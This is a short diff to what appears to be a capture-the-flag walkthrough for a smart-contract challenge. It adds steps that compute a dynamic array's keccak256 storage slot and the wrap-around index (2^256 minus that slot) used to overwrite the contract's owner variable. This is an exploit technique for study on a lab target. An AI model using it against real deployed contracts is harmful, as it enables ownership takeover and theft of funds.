@@ -15,9 +15,15 @@ Actual step:
 contract.retract();
 
 3. Find out where the owner variable is inside the array.
-
   
-
+  
+  find where the first array element is stored
+  
+  p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1] ))
+  
+  find where the owner variable is stored
+  
+  i = BigInt(2**256) - BigInt(p)
 
 4. change owner to our address
 
